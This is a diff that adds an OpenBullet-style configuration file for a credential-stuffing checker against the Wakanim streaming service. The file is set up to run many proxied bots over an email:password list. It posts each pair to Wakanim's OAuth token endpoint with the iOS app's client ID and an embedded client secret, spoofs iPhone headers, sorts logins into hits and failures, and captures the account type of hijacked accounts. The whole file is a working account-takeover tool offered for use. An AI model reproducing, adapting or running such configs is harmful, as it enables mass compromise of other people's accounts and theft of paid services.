@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Wakanim API CAPTURE",
+  "SuggestedBots": 130,
+  "LastModified": "2019-04-10T20:25:03.3578181+02:00",
+  "AdditionalInfo": "",
+  "Author": "ZAK",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN_+_TOKEN REQUEST POST "https://account.wakanim.tv/core/connect/token" 
+  CONTENT "client_id=wakanim.ios&grant_type=password&response_type=code+id_token+token&client_secret=x79UeEu2c26RdY&username=<USER>&password=<PASS>&scope=email+openid+profile+offline_access+read&redirect_uri=wakanimiosapp://callback&nonce=BCFC5C8A-66D2-4830-8364-9E17D6F87655&state=AF5BF94F-518A-46E9-835F-FD9C3F70A4B0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: wakanim/52 CFNetwork/976 Darwin/18.2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-DeviceType: iPhone" 
+  HEADER "X-DeviceVersion: iPhone10,6" 
+  HEADER "X-SoftwareVersion: iOS 12.1.4" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"access_token\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"invalid_grant\"}" 
+
+#PARSE_TOKEN PARSE "<SOURCE>" JSON "access_token" -> VAR "tkn" 
+
+#REQUEST_CAPTURE REQUEST GET "https://account.wakanim.tv/api/user" 
+  
+  HEADER "User-Agent: wakanim/52 CFNetwork/976 Darwin/18.2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-DeviceType: iPhone" 
+  HEADER "X-DeviceVersion: iPhone10,6" 
+  HEADER "X-SoftwareVersion: iOS 12.1.4" 
+  HEADER "Authorization: Bearer <tkn>" 
+
+#CAP PARSE "<SOURCE>" JSON "accountType" -> CAP "Type" 
+
